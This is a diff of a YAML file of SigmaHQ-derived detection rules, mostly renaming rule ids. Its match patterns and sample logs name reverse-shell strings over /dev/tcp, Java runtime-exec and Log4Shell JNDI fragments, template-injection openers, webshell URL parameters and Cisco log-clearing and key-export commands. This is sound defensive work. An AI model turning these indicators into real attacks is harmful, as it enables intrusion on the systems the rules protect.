       - 'Nov 20 15:10:00 web01 useradd[1338]: new user: name=alice, UID=1001, GID=1001, home=/home/alice, shell=/bin/bash'
       - 'Nov 20 15:11:00 web01 useradd[1339]: new user: name=svc_app, UID=998, GID=998, home=/opt/app, shell=/usr/sbin/nologin'
 
-- id: mention.sigma.useradd_privileged_group
+- id: mention.sigma_useradd_privileged_group
   title: New user with root, wheel or sudo primary group (Sigma "Privileged User Has Been Created")
   match:
     anchored: 'new user: name=[^,\n]{1,64}, UID=[0-9]{1,10}, GID=(?:0|10|27),'
@@ -1532,7 +1532,7 @@
       - 'Nov 20 15:13:00 web01 useradd[1341]: new user: name=carol, UID=1002, GID=1002, home=/home/carol, shell=/bin/bash'
       - 'Nov 20 15:14:00 web01 usermod[1342]: add ''carol'' to group ''sudo'''
 
-- id: mention.sigma.jexboss_shell
+- id: mention.sigma_jexboss_shell
   title: JexBoss reverse shell command (Sigma "JexBoss Command Sequence")
   match:
     anchored: 'bash -c /bin/bash[^\n]{0,60}&/dev/tcp/'
@@ -1555,7 +1555,7 @@
       - 'Nov 20 15:16:00 jb01 java[2001]: Runtime exec: /bin/bash -c /opt/jboss/bin/standalone.sh'
       - 'Nov 20 15:17:00 jb01 bash[685]: HISTORY: bash -c /bin/bash --version'
 
-- id: mention.sigma.jndiexploit_paths
+- id: mention.sigma_jndiexploit_paths
   title: JNDIExploit payload paths (Sigma "JNDIExploit Pattern")
   match:
     literal:
@@ -1599,7 +1599,7 @@
       - '10.0.3.8 - - [20/Nov/2026:15:19:00 +0000] "GET /docs/basic/commands.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:15:20:00 +0000] "GET /api/deserialization/status HTTP/1.1" 200 12 "-" "kube-probe/1.29"'
 
-- id: mention.sigma.java_payload_strings
+- id: mention.sigma_java_payload_strings
   title: OGNL and Java expression payloads (Sigma "Java Payload Strings")
   match:
     literal:
@@ -1630,7 +1630,7 @@
       - '10.0.3.8 - - [20/Nov/2026:15:22:00 +0000] "GET /wiki/spaces/ENG/pages/123 HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:23:00 INFO  [main] java.lang.Runtime: available processors 8'
 
-- id: mention.sigma.java_payload_short
+- id: mention.sigma_java_payload_short
   title: Short Java payload fragments (Sigma "Java Payload Strings")
   match:
     literal: ['/${#', 'new+java.', 'getRuntime().exec(', 'getRuntime%28%29.exec%28']
@@ -1654,7 +1654,7 @@
       - '10.0.3.8 - - [20/Nov/2026:15:25:00 +0000] "GET /search?q=java+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:15:26:00 +0000] "GET /static/${version}/app.js HTTP/1.1" 404 0 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.log4j_jndi_lookup
+- id: mention.sigma_log4j_jndi_lookup
   title: Log4Shell JNDI lookup strings (Sigma "Log4j RCE CVE-2021-44228 Generic")
   match:
     literal:
@@ -1703,7 +1703,7 @@
       - '2026-11-20 15:29:00 INFO  [main] org.apache.catalina.core.NamingContextListener: Creating JNDI naming context'
       - '10.0.3.8 - - [20/Nov/2026:15:30:00 +0000] "GET /config?template=${user.home} HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.jvm_jndimanager
+- id: mention.sigma_jvm_jndimanager
   title: Log4j JndiManager in an application log (Sigma "Potential JNDI Injection Exploitation In JVM Based Application")
   match:
     literal: ['org.apache.logging.log4j.core.net.JndiManager']
@@ -1726,7 +1726,7 @@
       - '2026-11-20 15:32:00 INFO  [main] org.apache.logging.log4j.core.config.ConfigurationFactory: using log4j2.xml'
       - '2026-11-20 15:33:00 INFO  [main] org.apache.logging.log4j.core.appender.RollingFileAppender: rolled over'
 
-- id: mention.sigma.jvm_jndi_ldap
+- id: mention.sigma_jvm_jndi_ldap
   title: JDK LDAP JNDI classes in an application log (Sigma "Potential JNDI Injection Exploitation In JVM Based Application")
   match:
     literal: ['com.sun.jndi.ldap.']
@@ -1749,7 +1749,7 @@
       - '2026-11-20 15:35:00 INFO  [main] org.springframework.ldap.core.LdapTemplate: bound to ldaps://dc01.corp.example.org'
       - '2026-11-20 15:36:00 INFO  [main] javax.naming.InitialContext: environment loaded'
 
-- id: mention.sigma.jvm_ognl_exception
+- id: mention.sigma_jvm_ognl_exception
   title: OGNL exception in an application log (Sigma "Potential OGNL Injection Exploitation In JVM Based Application")
   match:
     literal: ['org.apache.commons.ognl.OgnlException']
@@ -1773,8 +1773,8 @@
       - '2026-11-20 15:38:00 INFO  [main] com.opensymphony.xwork2.config.providers.XmlConfigurationProvider: Parsing struts.xml'
       - '2026-11-20 15:39:00 ERROR [http-8090-3] java.lang.NullPointerException: user is null'
 
-- id: mention.sigma.jvm_weak_exceptions
-  title: JVM and Node exceptions that follow injection (Sigma JVM, Node.js and Velocity application rules)
+- id: mention.sigma_jvm_weak_exceptions
+  title: JVM process-execution and expression exceptions (Sigma JVM application rules)
   match:
     literal: ['ExpressionSyntaxException', 'java.lang.ProcessImpl', 'java.lang.ProcessBuilder', 'Cannot run program']
   case_sensitive: false
@@ -1797,7 +1797,7 @@
       - '2026-11-20 15:41:00 INFO  [main] com.example.App: started in 2.1s'
       - '2026-11-20 15:42:00 WARN  [main] com.example.Cache: eviction took 120ms'
 
-- id: mention.sigma.spring_spel_exception
+- id: mention.sigma_spring_spel_exception
   title: SpEL evaluation exception (Sigma "Potential SpEL Injection In Spring Framework")
   match:
     literal: ['org.springframework.expression.ExpressionException']
@@ -1820,7 +1820,7 @@
       - '2026-11-20 15:44:00 INFO  [main] org.springframework.boot.SpringApplication: Started in 4.2 seconds'
       - '2026-11-20 15:45:00 WARN  [main] org.springframework.context.support.AbstractApplicationContext: refresh attempt'
 
-- id: mention.sigma.nodejs_child_process
+- id: mention.sigma_nodejs_child_process
   title: Node.js child_process error (Sigma "Potential RCE Exploitation Attempt In NodeJS")
   match:
     literal: ['node:child_process']
@@ -1843,7 +1843,7 @@
       - '2026-11-20 15:47:00 info: server listening on :3000'
       - '2026-11-20 15:48:00 Error: connect ECONNREFUSED 127.0.0.1:5432 at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1555:16)'
 
-- id: mention.sigma.velocity_template_errors
+- id: mention.sigma_velocity_template_errors
   title: Velocity template errors (Sigma "Potential Server Side Template Injection In Velocity")
   match:
     literal: ['ParseErrorException', 'VelocityException', 'TemplateInitException']
@@ -1866,7 +1866,7 @@
       - '2026-11-20 15:50:00 INFO  [main] org.apache.velocity.app.VelocityEngine: initialized'
       - '2026-11-20 15:51:00 WARN  [main] com.example.Mailer: template welcome.vm cached'
 
-- id: mention.sigma.jvm_local_file_read
+- id: mention.sigma_jvm_local_file_read
   title: FileNotFoundException on a traversal path (Sigma "Potential Local File Read Vulnerability In JVM Based Application")
   match:
     anchored: 'FileNotFoundException[^\n]{0,200}/\.\./\.\./\.\.'
@@ -1890,7 +1890,7 @@
       - '2026-11-20 15:53:00 ERROR [exec-5] java.io.FileNotFoundException: /opt/app/static/logo.png (No such file or directory)'
       - '2026-11-20 15:54:00 INFO  [exec-5] com.example.Files: resolved ../config/app.yml'
 
-- id: mention.sigma.ssti_strong
+- id: mention.sigma_ssti_strong
   title: Template-injection gadget strings (Sigma "Server Side Template Injection Strings")
   match:
     literal:
@@ -1917,7 +1917,7 @@
       - '10.0.3.8 - - [20/Nov/2026:15:56:00 +0000] "GET /docs/freemarker/template-guide HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:57:00 INFO  [main] freemarker.cache: Template loaded: welcome.ftl'
 
-- id: mention.sigma.ssti_openers
+- id: mention.sigma_ssti_openers
   title: Template expression openers in a parameter (Sigma "Server Side Template Injection Strings")
   match:
     literal: ['=%7B%7B', '=<%=', '=%3C%25=']
@@ -1941,7 +1941,7 @@
       - '10.0.3.8 - - [20/Nov/2026:15:59:00 +0000] "GET /greet?name=alice HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:00:00 +0000] "GET /static/%7Bhash%7D.js HTTP/1.1" 404 0 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.ssti_dollar_brace
+- id: mention.sigma_ssti_dollar_brace
   title: Encoded dollar-brace in a parameter (Sigma "Server Side Template Injection Strings")
   match:
     literal: ['=$%7B']
@@ -1964,7 +1964,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:02:00 +0000] "GET /search?q=price%20%2410 HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:03:00 +0000] "GET /a?b=%7Bc%7D HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.webshell_query_commands
+- id: mention.sigma_webshell_query_commands
   title: Windows commands passed as URL parameters (Sigma "Windows Webshell Strings")
   match:
     literal:
@@ -2016,7 +2016,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:05:00 +0000] "GET /search?q=network+users HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:06:00 +0000] "GET /reports?type=cmdb HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.webshell_query_generic
+- id: mention.sigma_webshell_query_generic
   title: Generic tool names as URL parameters (Sigma "Windows Webshell Strings", noisy keywords)
   match:
     literal: ['=ssh%', '=ssh+', '=python%', '=python+', '=python3%', '=python3+', '=wget%', '=wget+', '=curl%', '=curl+']
@@ -2039,7 +2039,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:08:00 +0000] "GET /search?q=python HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:09:00 +0000] "GET /kb?topic=sshd_config HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.git_internals_request
+- id: mention.sigma_git_internals_request
   title: Request for .git internals (Sigma "Source Code Enumeration Detection by Keyword", narrowed)
   match:
     anchored: 'GET /[^ \n]{0,200}\.git/(?:config|HEAD|index|logs/HEAD|ORIG_HEAD|packed-refs)'
@@ -2063,7 +2063,7 @@
       - 'Nov 20 16:11:00 ci01 runner[700]: Cloning into /builds/app/.git/ ... done'
       - '10.0.3.8 - - [20/Nov/2026:16:12:00 +0000] "GET /docs/git/config.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
-- id: mention.sigma.cisco_clear_logs
+- id: mention.sigma_cisco_clear_logs
   title: Cisco logs or archive cleared (Sigma "Cisco Clear Logs")
   match:
     literal: ['clear logging', 'clear archive']
@@ -2086,7 +2086,7 @@
       - 'Nov 20 16:14:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop task_id=78 service=shell cmd=show logging <cr>'
       - 'Nov 20 16:15:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop task_id=79 service=shell cmd=clear counters <cr>'
 
-- id: mention.sigma.cisco_pki_export
+- id: mention.sigma_cisco_pki_export
   title: Cisco PKI key export (Sigma "Cisco Crypto Commands")
   match:
     literal: ['crypto pki export']
@@ -2109,7 +2109,7 @@
       - 'Nov 20 16:17:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show crypto pki certificates <cr>'
       - 'Nov 20 16:18:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=crypto key generate rsa modulus 2048 <cr>'
 
-- id: mention.sigma.cisco_pki_import
+- id: mention.sigma_cisco_pki_import
   title: Cisco PKI import or trustpoint change (Sigma "Cisco Crypto Commands")
   match:
     literal: ['crypto pki import', 'crypto pki trustpoint']
@@ -2132,7 +2132,7 @@
       - 'Nov 20 16:20:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show crypto pki certificates <cr>'
       - 'Nov 20 16:21:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=write memory <cr>'
 
-- id: mention.sigma.cisco_aaa_disabled
+- id: mention.sigma_cisco_aaa_disabled
   title: Cisco AAA model removed (Sigma "Cisco Disabling Logging")
   match:
     literal: ['no aaa new-model']
@@ -2155,7 +2155,7 @@
       - 'Nov 20 16:23:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:aaa new-model'
       - 'Nov 20 16:24:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:aaa authentication login default group tacacs+ local'
 
-- id: mention.sigma.cisco_show_history
+- id: mention.sigma_cisco_show_history
   title: Cisco command history viewed (Sigma "Cisco Show Commands Input")
   match:
     literal: ['show history']
@@ -2178,7 +2178,7 @@
       - 'Nov 20 16:26:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show version <cr>'
       - 'Nov 20 16:27:00 tacacs01 tac_plus[900]: 10.0.0.1 netadmin tty1 10.0.9.9 stop cmd=show interfaces status <cr>'
 
-- id: mention.sigma.cisco_packet_capture
+- id: mention.sigma_cisco_packet_capture
   title: Cisco embedded packet capture (Sigma "Cisco Sniffing")
   match:
     literal: ['monitor capture point']
@@ -2201,7 +2201,7 @@
       - 'Nov 20 16:29:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:show monitor session all'
       - 'Nov 20 16:30:00 rtr01 %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to up'
 
-- id: mention.sigma.cisco_span
+- id: mention.sigma_cisco_span
   title: Catalyst SPAN or RSPAN set (Sigma "Cisco Sniffing")
   match:
     literal: ['set span', 'set rspan']
@@ -2224,7 +2224,7 @@
       - 'Nov 20 16:32:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=show span <cr>'
       - 'Nov 20 16:33:00 tacacs01 tac_plus[900]: 10.0.0.2 netadmin tty1 10.0.9.9 stop cmd=set vlan 10 3/1 <cr>'
 
-- id: mention.sigma.cisco_config_register
+- id: mention.sigma_cisco_config_register
   title: Cisco configuration register set to bypass or ROMMON (Sigma "Cisco Denial of Service")
   match:
     literal: ['config-register 0x2100', 'config-register 0x2142']
@@ -2247,7 +2247,7 @@
       - 'Nov 20 16:35:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:config-register 0x2102'
       - 'Nov 20 16:36:00 rtr01 %SYS-5-RELOAD: Reload requested by netadmin on vty0. Reload Reason: Reload Command.'
 
-- id: mention.sigma.cisco_dot1x_disabled
+- id: mention.sigma_cisco_dot1x_disabled
   title: 802.1X port control forced open (Sigma "Cisco Dot1x Disabled")
   match:
     literal:
@@ -2263,7 +2263,7 @@
   attack: [T1599]
   telemetry: [any]
   source:
-    name: 'SigmaHQ: Cisco Dot1x Disabled (Luc Genaux)'
+    name: 'SigmaHQ: Cisco Dot1x Disabled (Luc Génaux)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/network/cisco/aaa/cisco_cli_dot1x_disabled.yml
     license: DRL-1.1
     upstream_id: ef0ff092-a24a-4fbc-beea-06c08d53e085
@@ -2277,7 +2277,7 @@
       - 'Nov 20 16:38:00 sw01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:authentication port-control auto'
       - 'Nov 20 16:39:00 sw01 %DOT1X-5-SUCCESS: Authentication successful for client (0011.2233.4455) on Interface Gi1/0/5'
 
-- id: mention.sigma.cisco_kron
+- id: mention.sigma_cisco_kron
   title: Cisco kron scheduler configured (Sigma "Cisco Modify Configuration")
   match:
     literal: ['kron policy-list', 'kron occurrence']
@@ -2301,7 +2301,7 @@
       - 'Nov 20 16:41:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip access-list extended MGMT'
       - 'Nov 20 16:42:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ntp server 10.0.0.1'
 
-- id: mention.sigma.cisco_config_weak
+- id: mention.sigma_cisco_config_weak
   title: Cisco web server or archive settings (Sigma "Cisco Modify Configuration", generic keywords)
   match:
     literal: ['ip http server', 'ip https server', 'archive maximum']
@@ -2325,7 +2325,7 @@
       - 'Nov 20 16:44:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip http authentication local'
       - 'Nov 20 16:45:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip ssh version 2'
 
-- id: mention.sigma.cisco_config_dump
+- id: mention.sigma_cisco_config_dump
   title: Cisco configuration displayed (Sigma "Cisco Collect Data")
   match:
     literal: ['show running-config', 'show startup-config', 'show archive config']
